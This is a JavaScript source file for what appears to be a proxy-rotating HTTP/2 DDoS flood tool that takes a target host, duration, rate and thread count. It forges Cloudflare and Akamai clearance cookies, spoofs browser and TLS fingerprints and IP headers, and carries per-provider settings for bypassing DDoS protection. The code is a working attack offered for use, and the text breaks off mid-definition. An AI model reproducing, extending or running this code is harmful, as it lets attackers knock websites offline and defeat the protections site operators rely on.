

const crypto = require('crypto');
const tls = require('tls');
const net = require('net');
const http2 = require('http2');
const fs = require('fs');
const cluster = require('cluster');
const socks = require('socks').SocksClient;
const HPACK = require('hpack');
const { URL } = require('url');

// Advanced HPACK Simulator with Real Browser Logic
class AdvancedHPACKSimulator {
    constructor() {
        this.dynamicTable = [];
        this.maxTableSize = 4096;
        this.currentSize = 0;
        this.indexMap = new Map();
        this.staticTable = this.initStaticTable();
    }

    initStaticTable() {
        return new Map([
            [':authority', 1], [':method GET', 2], [':method POST', 3],
            [':path /', 4], [':scheme https', 7], ['accept', 19],
            ['accept-encoding', 16], ['accept-language', 17],
            ['cache-control', 24], ['cookie', 32], ['user-agent', 58]
        ]);
    }

    addToTable(name, value) {
        const entry = `${name}:${value}`;
        const entrySize = name.length + value.length + 32;
        
        while (this.currentSize + entrySize > this.maxTableSize && this.dynamicTable.length > 0) {
            const removed = this.dynamicTable.shift();
            this.currentSize -= (removed.name.length + removed.value.length + 32);
        }
        
        this.dynamicTable.push({ name, value, entry });
        this.indexMap.set(entry, this.dynamicTable.length + 61);
        this.currentSize += entrySize;
    }

    compressHeaders(headers) {
        const compressed = [];
        const headerOrder = [
            ':method', ':path', ':scheme', ':authority',
            'cache-control', 'sec-ch-ua', 'sec-ch-ua-mobile', 'sec-ch-ua-platform',
            'upgrade-insecure-requests', 'user-agent', 'accept',
            'sec-fetch-site', 'sec-fetch-mode', 'sec-fetch-user', 'sec-fetch-dest',
            'accept-encoding', 'accept-language', 'cookie', 'referer'
        ];

        const orderedHeaders = {};
        headerOrder.forEach(key => {
            if (headers[key]) orderedHeaders[key] = headers[key];
        });
        Object.keys(headers).forEach(key => {
            if (!orderedHeaders[key]) orderedHeaders[key] = headers[key];
        });

        for (const [name, value] of Object.entries(orderedHeaders)) {
            const entry = `${name}:${value}`;
            if (this.indexMap.has(entry)) {
                compressed.push(`INDEX:${this.indexMap.get(entry)}`);
            } else {
                compressed.push(`LITERAL:${name}:${value}`);
                this.addToTable(name, value);
            }
        }

        return compressed;
    }
}

// Advanced Fingerprint Generator
class BrowserFingerprintGenerator {
    constructor() {
        this.fingerprintCache = new Map();
        this.sessionData = new Map();
        this.initRealFingerprints();
    }

    initRealFingerprints() {
        this.realFingerprints = [
            {
                platform: 'Windows',
                browser: 'Chrome',
                version: '120.0.0.0',
                ua: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                viewport: '1920x1080',
                webgl: 'ANGLE (Intel, Intel(R) UHD Graphics 620 Direct3D11 vs_5_0 ps_5_0, D3D11)',
                canvas: this.generateCanvasHash('chrome'),
                audio: this.generateAudioContext('chrome'),
                timezone: 'Asia/Ho_Chi_Minh'
            },
            {
                platform: 'macOS',
                browser: 'Chrome',
                version: '120.0.0.0',
                ua: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                viewport: '1440x900',
                webgl: 'WebKit WebGL',
                canvas: this.generateCanvasHash('chrome'),
                audio: this.generateAudioContext('chrome'),
                timezone: 'Asia/Bangkok'
            },
            {
                platform: 'Linux',
                browser: 'Firefox',
                version: '121.0',
                ua: 'Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0',
                viewport: '1366x768',
                webgl: 'Mesa DRI Intel(R)',
                canvas: this.generateCanvasHash('firefox'),
                audio: this.generateAudioContext('firefox'),
                timezone: 'Asia/Seoul'
            },
            {
                platform: 'Windows',
                browser: 'Edge',
                version: '120.0.0.0',
                ua: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
                viewport: '1920x1080',
                webgl: 'ANGLE (Intel, Intel(R) UHD Graphics 620 Direct3D11 vs_5_0 ps_5_0, D3D11)',
                canvas: this.generateCanvasHash('edge'),
                audio: this.generateAudioContext('edge'),
                timezone: 'Asia/Tokyo'
            },
            {
                platform: 'macOS',
                browser: 'Safari',
                version: '16.0',
                ua: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15',
                viewport: '1440x900',
                webgl: 'WebKit WebGL',
                canvas: this.generateCanvasHash('safari'),
                audio: this.generateAudioContext('safari'),
                timezone: 'Asia/Hong_Kong'
            }
        ];
    }

    generateCanvasHash() {
        return crypto.randomBytes(16).toString('hex');
    }

    generateAudioContext() {
        return (Math.random() * 124.04344968795776).toFixed(15);
    }

    getRandomFingerprint() {
        return this.realFingerprints[Math.floor(Math.random() * this.realFingerprints.length)];
    }

    generateAdvancedCookies(hostname, sessionId) {
        const timestamp = Date.now();
        const baseTime = timestamp - Math.floor(Math.random() * 2592000000);
        
        const cookies = {
            cf_clearance: this.generateCfClearance(hostname, sessionId),
            __cf_bm: this.generateCfBm(),
            _cfuvid: `${this.randomHex(32)}.${Math.floor(timestamp/1000)}`,
            ak_bmsc: this.randomBase64(88),
            _abck: `${this.randomBase64(144)}~0~${this.randomBase64(64)}~0~-1`,
            bm_mi: this.generateBmMi(),
            bm_sv: this.generateBmSv(),
            _ga: `GA1.1.${this.generateGAClientId()}.${Math.floor(baseTime/1000)}`,
            [`_ga_${this.randomString(10, 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789')}`]: `GS1.1.${timestamp}.1.1.${timestamp + Math.floor(Math.random()*3600000)}.0`,
            _gid: `GA1.2.${this.generateGAClientId()}.${Math.floor(timestamp/86400000)}`,
            sessionid: this.randomHex(32),
            csrftoken: this.randomBase64(64),
            _fbp: `fb.1.${timestamp}.${Math.floor(Math.random() * 2000000000)}`,
            _fbc: `fb.1.${timestamp}.${this.randomString(16)}`,
            gdpr_consent: `1~${this.generateConsentString()}`,
            euconsent: this.generateEuConsent(),
            // BFM bypass cookies
            __cf_bfm: this.randomBase64(64) + '.' + timestamp
        };

        return Object.entries(cookies)
            .map(([k, v]) => `${k}=${v}`)
            .join('; ');
    }

    generateCfClearance(hostname, sessionId) {
        const timestamp = Math.floor(Date.now() / 1000);
        const challenge = this.randomBase64(43);
        const hmac = crypto.createHmac('sha256', `${hostname}:${sessionId}`)
            .update(`${challenge}:${timestamp}`)
            .digest('hex').slice(0, 8);
        return `${challenge}.${sessionId}-${timestamp}-${hmac}.bfm${Math.random().toString(36).slice(2, 8)}`; // BFM token
    }

    generateCfBm() {
        return this.randomBase64(43) + '=';
    }

    generateBmMi() {
        return `${this.randomHex(32)}~${this.randomHex(16)}`;
    }

    generateBmSv() {
        return `${this.randomBase64(1000)}~${this.randomHex(8)}~${Date.now()}`;
    }

    generateGAClientId() {
        return `${Math.floor(Math.random() * 2000000000)}.${Math.floor(Math.random() * 2000000000)}`;
    }

    generateConsentString() {
        const purposes = Array(24).fill().map(() => Math.random() > 0.3 ? '1' : '0').join('');
        return Buffer.from(purposes).toString('base64').replace(/=/g, '');
    }

    generateEuConsent() {
        return `CP${this.randomString(20, 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_')}.`;
    }

    randomString(length, chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789") {
        return Array.from(crypto.randomBytes(length))
            .map(b => chars[b % chars.length])
            .join('');
    }

    randomBase64(length) {
        return Buffer.from(crypto.randomBytes(Math.ceil(length * 3/4)))
            .toString('base64')
            .replace(/=/g, '')
            .slice(0, length);
    }

    randomHex(length) {
        return crypto.randomBytes(Math.ceil(length/2))
            .toString('hex')
            .slice(0, length);
    }
}

// Advanced Redirect Handler
class AdvancedRedirectHandler {
    constructor(options = {}) {
        this.compressor = new HPACK();
        this.maxRedirects = options.maxRedirects || 15;
        this.redirectHistory = [];
        this.redirectTimings = [];
        this.suspiciousPatterns = new Set();
        
        this.redirectBehaviors = {
            humanLike: true,
            respectRobotsTxt: false,
            handleJSRedirects: true,
            bypassProtection: true,
            mimicBrowserTiming: true
        };
    }

    async handleRedirect(response, currentUrl, options = {}) {
        const location = this.extractLocation(response);
        if (!location) return null;

        const redirectUrl = this.resolveRedirectUrl(location, currentUrl);
        const redirectType = this.analyzeRedirectType(response, redirectUrl, currentUrl);
        
        if (this.isProtectionRedirect(redirectType, redirectUrl)) {
            return this.handleProtectionRedirect(redirectUrl, currentUrl, options);
        }

        await this.calculateRedirectDelay(redirectType, currentUrl, redirectUrl);
        
        const redirectOptions = this.prepareRedirectOptions(options, currentUrl, redirectUrl, redirectType);
        
        return { redirectUrl, redirectOptions, redirectType };
    }

    extractLocation(response) {
        return response[':location'] || 
               response['location'] || 
               response['Location'] ||
               this.extractMetaRefresh(response.body) ||
               this.extractJSRedirect(response.body);
    }

    extractMetaRefresh(body) {
        if (!body) return null;
        const match = body.match(/<meta[^>]*http-equiv=["']refresh["'][^>]*content=["'][^"']*url=([^"'>\s]+)/i);
        return match ? match[1] : null;
    }

    extractJSRedirect(body) {
        if (!body) return null;
        const patterns = [
            /window\.location\.href\s*=\s*["']([^"']+)["']/i,
            /window\.location\s*=\s*["']([^"']+)["']/i,
            /location\.href\s*=\s*["']([^"']+)["']/i,
            /document\.location\s*=\s*["']([^"']+)["']/i,
            /window\.location\.replace\s*\(\s*["']([^"']+)["']\s*\)/i
        ];
        
        for (const pattern of patterns) {
            const match = body.match(pattern);
            if (match) return match[1];
        }
        return null;
    }

    resolveRedirectUrl(location, currentUrl) {
        try {
            return new URL(location, currentUrl).href;
        } catch {
            return location;
        }
    }

    analyzeRedirectType(response, redirectUrl, currentUrl) {
        const status = response[':status'];
        const currentDomain = new URL(currentUrl).hostname;
        const redirectDomain = new URL(redirectUrl).hostname;
        
        const type = {
            status,
            crossDomain: currentDomain !== redirectDomain,
            isProtection: this.detectProtectionRedirect(response, redirectUrl),
            isChallenge: this.detectChallengeRedirect(response, redirectUrl),
            isLoop: this.redirectHistory.includes(redirectUrl),
            timing: Date.now()
        };

        this.redirectHistory.push(redirectUrl);
        this.redirectTimings.push(type.timing);
        
        if (this.redirectHistory.length > this.maxRedirects) {
            this.redirectHistory.shift();
            this.redirectTimings.shift();
        }

        return type;
    }

    detectProtectionRedirect(response, redirectUrl) {
        const protectionSigns = [
            /cloudflare/i.test(redirectUrl),
            /cf-ray/i.test(JSON.stringify(response)),
            /cdn-cgi/i.test(redirectUrl),
            /__cf_bm/i.test(response.cookie || ''),
            /incapsula/i.test(redirectUrl),
            /imperva/i.test(redirectUrl),
            /distil/i.test(redirectUrl),
            /perimeterx/i.test(redirectUrl),
            /datadome/i.test(redirectUrl),
            /challenge/i.test(redirectUrl),
            /security/i.test(redirectUrl),
            /verify/i.test(redirectUrl),
            /captcha/i.test(redirectUrl),
            /bot.?check/i.test(redirectUrl)
        ];

        return protectionSigns.some(pattern => 
            typeof pattern === 'boolean' ? pattern : pattern.test(redirectUrl)
        );
    }

    detectChallengeRedirect(response, redirectUrl) {
        const challengePatterns = [
            /challenge.*platform/i,
            /security.*check/i,
            /browser.*check/i,
            /javascript.*challenge/i,
            /pow.*challenge/i,
            /ray.*id/i
        ];

        const body = response.body || '';
        const headers = JSON.stringify(response);
        
        return challengePatterns.some(pattern => 
            pattern.test(redirectUrl) || pattern.test(body) || pattern.test(headers)
        );
    }

    isProtectionRedirect(redirectType, redirectUrl) {
        return redirectType.isProtection || 
               redirectType.isChallenge ||
               this.suspiciousPatterns.has(new URL(redirectUrl).hostname);
    }

    async handleProtectionRedirect(redirectUrl, currentUrl, options) {
        const bypassStrategy = this.selectBypassStrategy(redirectUrl);
        
        switch (bypassStrategy) {
            case 'cloudflare':
                return this.bypassCloudflare(redirectUrl, currentUrl, options);
            case 'challenge':
                return this.bypassChallenge(redirectUrl, currentUrl, options);
            case 'aggressive':
                return this.bypassAggressive(redirectUrl, currentUrl, options);
            default:
                return this.bypassGeneric(redirectUrl, currentUrl, options);
        }
    }

    selectBypassStrategy(redirectUrl) {
        if (/cloudflare|cdn-cgi|cf-ray/i.test(redirectUrl)) return 'cloudflare';
        if (/challenge|verify|captcha/i.test(redirectUrl)) return 'challenge';
        if (this.redirectHistory.length > 5) return 'aggressive';
        return 'generic';
    }

    async bypassCloudflare(redirectUrl, currentUrl, options) {
        const cfDelay = this.calculateCFDelay();
        await this.sleep(cfDelay);
        
        const cfOptions = {
            ...options,
            customHeaders: {
                ...options.customHeaders,
                'cf-connecting-ip': this.generateRandomIP(),
                'cf-ipcountry': this.getRandomCountryCode(),
                'cf-ray': this.generateCFRay(),
                'cf-visitor': '{"scheme":"https"}',
                'x-forwarded-for': this.generateRandomIP(),
                'x-real-ip': this.generateRandomIP()
            },
            fetchSite: 'same-origin',
            fetchMode: 'navigate',
            fetchDest: 'document'
        };

        return { redirectUrl, redirectOptions: cfOptions, bypassType: 'cloudflare' };
    }

    async bypassChallenge(redirectUrl, currentUrl, options) {
        const challengeDelay = Math.floor(Math.random() * 3000) + 2000;
        await this.sleep(challengeDelay);
        
        const challengeOptions = {
            ...options,
            customHeaders: {
                ...options.customHeaders,
                'upgrade-insecure-requests': '1',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'x-requested-with': null
            }
        };

        return { redirectUrl, redirectOptions: challengeOptions, bypassType: 'challenge' };
    }

    async bypassAggressive(redirectUrl, currentUrl, options) {
        const aggressiveDelay = Math.floor(Math.random() * 1000) + 500;
        await this.sleep(aggressiveDelay);
        
        const aggressiveOptions = {
            ...options,
            rotateHeaders: true,
            customHeaders: {
                ...options.customHeaders,
                'cache-control': 'no-cache, no-store, must-revalidate',
                'pragma': 'no-cache',
                'expires': '0',
                'x-forwarded-proto': 'https',
                'x-scheme': 'https'
            }
        };

        return { redirectUrl, redirectOptions: aggressiveOptions, bypassType: 'aggressive' };
    }

    async bypassGeneric(redirectUrl, currentUrl, options) {
        const genericDelay = this.calculateHumanDelay();
        await this.sleep(genericDelay);
        
        return { 
            redirectUrl, 
            redirectOptions: options, 
            bypassType: 'generic' 
        };
    }

    async calculateRedirectDelay(redirectType, currentUrl, redirectUrl) {
        let delay = 0;

        if (redirectType.crossDomain) {
            delay += Math.floor(Math.random() * 500) + 200;
        } else {
            delay += Math.floor(Math.random() * 200) + 100;
        }

        if (redirectType.isProtection) {
            delay += Math.floor(Math.random() * 2000) + 1000;
        }

        if (redirectType.isChallenge) {
            delay += Math.floor(Math.random() * 3000) + 2000;
        }

        const recentRedirects = this.redirectTimings.filter(t => 
            Date.now() - t < 10000
        ).length;
        
        if (recentRedirects > 3) {
            delay += recentRedirects * 500;
        }

        delay += this.calculateHumanDelay();

        return Math.min(delay, 10000);
    }

    calculateHumanDelay() {
        const baseDelay = Math.floor(Math.random() * 1000) + 500;
        const variation = Math.floor(Math.random() * 500) - 250;
        return Math.max(baseDelay + variation, 100);
    }

    calculateCFDelay() {
        return Math.floor(Math.random() * 2000) + 3000;
    }

    prepareRedirectOptions(options, currentUrl, redirectUrl, redirectType) {
        const redirectOptions = { ...options };
        
        redirectOptions.referer = currentUrl;
        
        const currentHost = new URL(currentUrl).hostname;
        const redirectHost = new URL(redirectUrl).hostname;
        
        if (currentHost === redirectHost) {
            redirectOptions.fetchSite = 'same-origin';
        } else if (this.isSameSite(currentHost, redirectHost)) {
            redirectOptions.fetchSite = 'same-site';
        } else {
            redirectOptions.fetchSite = 'cross-site';
        }

        if (redirectType.isProtection || redirectType.isChallenge) {
            redirectOptions.fetchMode = 'navigate';
            redirectOptions.fetchDest = 'document';
            redirectOptions.fetchUser = '?1';
        }

        return redirectOptions;
    }

    isSameSite(host1, host2) {
        try {
            const domain1 = host1.split('.').slice(-2).join('.');
            const domain2 = host2.split('.').slice(-2).join('.');
            return domain1 === domain2;
        } catch {
            return false;
        }
    }

    generateRandomIP() {
        return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
    }

    generateCFRay() {
        const chars = '0123456789abcdef';
        let ray = '';
        for (let i = 0; i < 16; i++) {
            ray += chars[Math.floor(Math.random() * chars.length)];
        }
        return ray + '-' + this.getRandomCountryCode();
    }

    getRandomCountryCode() {
        const countryCodes = ['US', 'VN', 'JP', 'DE', 'FR', 'GB', 'CN', 'IN', 'BR', 'AU', 'CA', 'RU', 'KR', 'SG'];
        return randomElement(countryCodes);
    }

    async sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }

    reset() {
        this.redirectHistory = [];
        this.redirectTimings = [];
    }

    getStats() {
        return {
            totalRedirects: this.redirectHistory.length,
            uniqueHosts: [...new Set(this.redirectHistory.map(url => new URL(url).hostname))],
            averageDelay: this.redirectTimings.length > 1 ? 
                this.redirectTimings.slice(1).reduce((sum, time, i) => 
                    sum + (time - this.redirectTimings[i]), 0) / (this.redirectTimings.length - 1) : 0,
            suspiciousHosts: [...this.suspiciousPatterns]
        };
    }
}

// Optimized HTTP/2 Settings by ISP
function getOptimizedHttp2SettingsByISP(isp) {
    const defaultSettings = {
        headerTableSize: 65536,
        initialWindowSize: 6291456,
        maxHeaderListSize: 262144,
        enablePush: false,
        maxConcurrentStreams: Math.random() < 0.5 ? 100 : 1000,
        maxFrameSize: 40000,
        enableConnectProtocol: false,
        bfmBypass: options.highbypass // Enable BFM bypass if highbypass is on
    };

    const settings = { ...defaultSettings };

    switch (isp) {
        case 'Cloudflare, Inc.':
            settings.priority = 1;
            settings.headerTableSize = 65536;
            settings.maxConcurrentStreams = Math.random() > 0.5 ? 1000 : 10000;
            settings.initialWindowSize = 6291456;
            settings.maxFrameSize = Math.random() > 0.25 ? 40000 : 131072;
            settings.maxHeaderListSize = Math.random() > 0.5 ? 262144 : 524288;
            settings.enablePush = false;
            settings.bfmBypass = true; // Enhanced BFM bypass
            break;
        case 'FDCservers.net':
        case 'OVH SAS':
        case 'VNXCLOUD':
            settings.priority = 0;
            settings.headerTableSize = 4096;
            settings.initialWindowSize = 65536;
            settings.maxFrameSize = 16777215;
            settings.maxConcurrentStreams = 128;
            settings.maxHeaderListSize = 4294967295;
            settings.bfmBypass = options.highbypass;
            break;
        case 'Akamai Technologies, Inc.':
        case 'Akamai International B.V.':
            settings.priority = 1;
            settings.headerTableSize = 65536;
            settings.maxConcurrentStreams = 1000;
            settings.initialWindowSize = 6291456;
            settings.maxFrameSize = 16384;
            settings.maxHeaderListSize = 32768;
            settings.bfmBypass = options.highbypass;
            break;
        case 'Fastly, Inc.':
        case 'Optitrust GmbH':
            settings.priority = 0;
            settings.headerTableSize = 4096;
            settings.initialWindowSize = 65535;
            settings.maxFrameSize = 16384;
            settings.maxConcurrentStreams = 100;
            settings.maxHeaderListSize = 4294967295;
            settings.bfmBypass = options.highbypass;
            break;
        case 'Ddos-guard LTD':
            settings.priority = 1;
            settings.maxConcurrentStreams = Math.random() > 0.7 ? 1 : 10; // Randomized for bypass
            settings.initialWindowSize = 65535;
            settings.maxFrameSize = 16777215;
            settings.maxHeaderListSize = 262144;
            settings.bfmBypass = true;
            break;
        case 'Amazon.com, Inc.':
        case 'Amazon Technologies Inc.':
            settings.priority = 0;
            settings.maxConcurrentStreams = Math.random() > 0.5 ? 100 : 200;
            settings.initialWindowSize = 65535;
            settings.maxHeaderListSize = 262144;
            settings.bfmBypass = options.highbypass;
            break;
        case 'Microsoft Corporation':
        case 'Vietnam Posts and Telecommunications Group':
        case 'VIETNIX':
            settings.priority = 0;
            settings.headerTableSize = 4096;
            settings.initialWindowSize = 8388608;
            settings.maxFrameSize = 16384;
            settings.maxConcurrentStreams = 100;
            settings.maxHeaderListSize = 4294967295;
            settings.bfmBypass = options.highbypass;
            break;
        case 'Google LLC':
            settings.priority = 0;
            settings.headerTableSize = 4096;
            settings.initialWindowSize = 1048576;
            settings.maxFrameSize = 16384;
            settings.maxConcurrentStreams = Math.random() > 0.5 ? 100 : 150;
            settings.maxHeaderListSize = 137216;
            settings.bfmBypass = options.highbypass;
            break;
        default:
            settings.headerTableSize = 65535;
            settings.maxConcurrentStreams = Math.random() > 0.5 ? 1000 : 2000;
            settings.initialWindowSize = 6291456;
            settings.maxHeaderListSize = 261144;
            settings.maxFrameSize = 16384;
            settings.bfmBypass = options.highbypass;
            break;
    }

    return settings;
}

// Error handling with logging
process.setMaxListeners(50);
process.on('uncaughtException', (err) => {
    // Suppress error logs as requested
});
process.on('unhandledRejection', (reason) => {
    // Suppress error logs as requested
});

// TLS configurations
const cplist = [
    'TLS_AES_128_GCM_SHA256',
    'TLS_AES_256_GCM_SHA384',
    'TLS_CHACHA20_POLY1305_SHA256',
    'ECDHE-RSA-AES128-GCM-SHA256',
    'ECDHE-RSA-AES256-GCM-SHA384',
    'TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256',
    'TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA',
    'TLS_RSA_WITH_AES_128_GCM_SHA256'
];
const sigalgs = "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512";
const ecdhCurve = ["GREASE:x25519:secp256r1:secp384r1:secp521r1", "x25519:secp256r1"];
const secureOptions =
    crypto.constants.SSL_OP_NO_SSLv2 |
    crypto.constants.SSL_OP_NO_SSLv3 |
    crypto.constants.SSL_OP_NO_TLSv1 |
    crypto.constants.SSL_OP_NO_TLSv1_1 |
    crypto.constants.SSL_OP_NO_COMPRESSION |
    crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE;
const sharedTicketKeys = crypto.randomBytes(48);

const secureop = {
    sigalgs: sigalgs,
    honorCipherOrder: true,
    secureOptions: secureOptions,
    minVersion: 'TLSv1.2',
    maxVersion: 'TLSv1.3',
    ticketKeys: sharedTicketKeys
};

const secureContext = tls.createSecureContext(secureop);

// Initialize global instances
const hpack = new AdvancedHPACKSimulator();
const fingerprintGen = new BrowserFingerprintGenerator();
const redirectHandler = new AdvancedRedirectHandler({ maxRedirects: 15 });

// Command-line parsing
const [,, host, time, rate, thread, proxyfile, ...args] = process.argv;
const options = {
    useAll: args.includes('--all'),
    randpath: args.includes('--randpath') || args.includes('--all'),
    highbypass: args.includes('--bypass') || args.includes('--all'),
    cachebypass: args.includes('--cache') || args.includes('--all'),
    fullheaders: args.includes('--full') || args.includes('--all'),
    extraheaders: args.includes('--extra') || args.includes('--all'),
    queryopt: args.includes('--query') || args.includes('--all'),
    fingerprintopt: args.includes('--fingerprint') || args.includes('--all'),
    ratelimitopt: args.includes('--ratelimit') || args.includes('--all'),
    redirect: args.includes('--redirect') || args.includes('--all'),
    npath: args.includes('--npath') || args.includes('--all'),
    backend: args.includes('--backend') || args.includes('--all'),
    proxytype: args.includes('--type') && args[args.indexOf('--type') + 1] ? args[args.indexOf('--type') + 1] : 'http',
    info: args.includes('--info')
};

if (options.useAll) {
    options.randpath = !args.includes('--all-randpath') && options.randpath;
    options.highbypass = !args.includes('--all-bypass') && options.highbypass;
    options.cachebypass = !args.includes('--all-cache') && options.cachebypass;
    options.fullheaders = !args.includes('--all-full') && options.fullheaders;
    options.extraheaders = !args.includes('--all-extra') && options.extraheaders;
    options.queryopt = !args.includes('--all-query') && options.queryopt;
    options.fingerprintopt = !args.includes('--all-fingerprint') && options.fingerprintopt;
    options.ratelimitopt = !args.includes('--all-ratelimit') && options.ratelimitopt;
    options.redirect = !args.includes('--all-redirect') && options.redirect;
    options.npath = !args.includes('--all-npath') && options.npath;
    options.backend = !args.includes('--all-backend') && options.backend;
}

if (!host || !time || !rate || !thread || !proxyfile || !['http', 'socks4', 'socks5'].includes(options.proxytype.toLowerCase())) {
    console.log(`node advanced-bypass.js host time rate thread proxy.txt [options]`);
    console.log(`Options:`);
    console.log(`  --randpath: Randomize request paths`);
    console.log(`  --bypass: Enable advanced anti-bot bypass`);
    console.log(`  --cache: Bypass cache with random queries`);
    console.log(`  --full: Include full browser headers`);
    console.log(`  --extra: Add extra evasion headers`);
    console.log(`  --query: Optimize queries with random parameters`);
    console.log(`  --fingerprint: Enable TLS and browser fingerprinting`);
    console.log(`  --ratelimit: Handle rate limiting dynamically`);
    console.log(`  --redirect: Enable handling of 301, 302, 307 redirects`);
    console.log(`  --npath: Attack raw URL without additional paths`);
    console.log(`  --backend: Enable advanced backend bypass for major providers (Cloudflare, Akamai, etc.)`);
    console.log(`  --all: Enable all options`);
    console.log(`  --all-<option>: Disable specific option when using --all (e.g., --all-ratelimit)`);
    console.log(`  --type <http/socks4/socks5>: Specify proxy type`);
    console.log(`  --info: Display attack configuration`);
    process.exit(1);
}
// Validate proxy file
let proxies = [];
try {
    if (!fs.existsSync(proxyfile)) {
        console.error(`Proxy file ${proxyfile} does not exist`);
        process.exit(1);
    }
    proxies = fs.readFileSync(proxyfile, 'utf-8')
        .split('\n')
        .map(line => line.trim())
        .filter(line => line.length > 0 && line.includes(':'));
    if (proxies.length === 0) {
        console.error(`Proxy file ${proxyfile} is empty or contains no valid proxies`);
        process.exit(1);
    }
} catch (err) {
    console.error(`Error reading proxy file ${proxyfile}:`, err.message);
    process.exit(1);
}

// Proxy connection pool
const connectionPool = new Map();
const MAX_CONNECTIONS_PER_WORKER = 10;

function randomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function randomElement(arr) {
    return arr[Math.floor(Math.random() * arr.length)] || arr[0] || null;
}

function random_string(length, chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789") {
    return Array.from(crypto.randomBytes(length))
        .map(b => chars[b % chars.length])
        .join('');
}

function randomBase64(length) {
    return Buffer.from(crypto.randomBytes(Math.ceil(length * 3/4)))
        .toString('base64')
        .replace(/=/g, '')
        .slice(0, length);
}

function randomHex(length) {
    return crypto.randomBytes(Math.ceil(length/2))
        .toString('hex')
        .slice(0, length);
}

function generateAdvancedPath(hostname) {
    if (options.npath) {
        return '/'; // Use root path for --npath
    }

    let path = host.replace('%RAND%', random_string(randomInt(3, 8))); // Support %RAND%
    if (!options.randpath) {
        return new URL(path).pathname || '/';
    }

    const basePaths = ['/', '/api', '/login', '/search', '/home', '/dashboard'];
    path = `${randomElement(basePaths)}/${random_string(randomInt(3, 8))}`;
    
    if (options.cachebypass || options.queryopt) {
        const params = [];
        params.push(`cb=${randomHex(8)}`);
        params.push(`ts=${Date.now()}`);
        params.push(`r=${random_string(6)}`);
        path += `?${params.join('&')}`;
    }
    
    return path;
}

function fixJA3Fingerprint() {
    const ja3 = "769,49195,0-4-5-6-10-11-14-15-16-18-23-29-33-36-39-51-53,0-1-2-4,0";
    return crypto.createHash('md5').update(ja3).digest('hex');
}

function generateBaseHeaders(proxy, hostname, fingerprint, sessionId) {
    const version = randomInt(127, 131);
    const fullVersion = `${version}.0.${randomInt(6610, 6790)}.${randomInt(10, 100)}`;
    const isChrome = fingerprint.browser === 'Chrome';
    const isFirefox = fingerprint.browser === 'Firefox';

    const baseHeaders = {
        ':method': Math.random() < 0.9 ? 'GET' : 'POST',
        ':authority': hostname,
        ':scheme': 'https',
        ':path': generateAdvancedPath(hostname),
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'sec-fetch-site': 'none',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-dest': 'document',
        'accept-encoding': randomElement(['gzip, deflate, br', 'gzip', 'deflate']),
        'accept-language': randomElement(['en-US,en;q=0.9', 'vi-VN,vi;q=0.8,en-US;q=0.7', 'fr-FR,fr;q=0.9,en-US;q=0.8']),
        'cf-ipcountry': redirectHandler.getRandomCountryCode(),
        'x-cloudflare-bot-score': Math.floor(Math.random() * 100).toString()
    };

    if (options.cachebypass) {
        Object.assign(baseHeaders, {
            'cache-control': 'no-cache, no-store, must-revalidate',
            'pragma': 'no-cache',
            'if-modified-since': new Date(Date.now() - 86400000).toUTCString()
        });
    }

    if (isChrome) {
        Object.assign(baseHeaders, {
            'sec-ch-ua': `"${fingerprint.browser}";v="${version}", "Not=A?Brand";v="8", "Chromium";v="${version}"`,
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': `"${fingerprint.platform}"`,
            'sec-ch-ua-platform-version': fingerprint.platform === 'Windows' ? '"10.0.0"' : '"14.5.0"',
            'user-agent': fingerprint.ua
        });
    } else if (isFirefox) {
        Object.assign(baseHeaders, {
            'user-agent': fingerprint.ua,
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'accept-language': 'vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3',
            'accept-encoding': 'gzip, deflate, br',
            'dnt': '1',
            'upgrade-insecure-requests': '1',
            'te': 'trailers'
        });
    }

    if (options.fullheaders) {
        Object.assign(baseHeaders, {
            'sec-ch-ua-arch': fingerprint.platform.includes('Windows') || fingerprint.platform.includes('Linux') ? '"x86"' : '"arm"',
            'sec-ch-ua-bitness': '"64"',
            'sec-ch-ua-full-version': `"${fullVersion}"`
        });
    }

    if (options.highbypass) {
        const cookies = fingerprintGen.generateAdvancedCookies(hostname, sessionId);
        Object.assign(baseHeaders, {
            'cookie': cookies,
            'x-requested-with': 'XMLHttpRequest',
            'x-forwarded-for': `${randomInt(1, 255)}.${randomInt(1, 255)}.${randomInt(1, 255)}.${randomInt(1, 254)}`,
            'x-real-ip': proxy.split(':')[0]
        });
    }

    if (options.extraheaders) {
        Object.assign(baseHeaders, {
            'x-forwarded-proto': 'https',
